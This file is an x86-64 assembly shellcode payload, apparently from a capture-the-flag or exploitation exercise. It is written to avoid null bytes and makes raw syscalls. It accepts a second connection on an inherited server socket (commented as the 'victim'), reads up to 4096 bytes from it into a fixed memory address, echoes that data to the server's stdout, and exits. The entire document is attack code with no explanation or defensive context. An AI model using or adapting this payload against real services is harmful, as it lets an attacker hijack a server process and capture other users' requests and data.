.global _start
_start:
.intel_syntax noprefix
	xor rax, rax
	mov al, 43	# accept the second connection which is going to be victim
	xor rdi, rdi
	mov dil, 3	# fd = 3 (server socket)
	xor rsi, rsi
	xor rdx, rdx
	syscall

	mov dil, al
	xor rax, rax	#read data from new connected client
	mov dx, 0xfff
	inc dx
	mov si, 0x4040
	shl rsi, 8
	mov sil, 0x20
	syscall

	mov dil, 1 # fd = 1 stdout
	xor rax, rax# prin the request content froom victim in stdout of server
	inc rax
	mov dx, 0xfff
        inc dx
	xor rsi, rsi
        mov si, 0x4040
        shl rsi, 8
        mov sil, 0x20
	syscall

	xor rdi, rdi
	xor rax, rax
	mov al, 60
	syscall
